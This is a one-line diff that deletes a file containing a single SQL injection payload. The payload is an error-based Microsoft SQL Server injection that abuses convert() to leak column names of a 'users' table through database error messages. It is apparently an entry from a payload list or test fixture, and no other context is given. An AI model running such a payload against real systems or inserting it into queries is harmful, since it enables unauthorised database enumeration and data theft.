@@ -1,1 +1,0 @@
-SELECT * FROM users WHERE id='1' AND 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='users'))
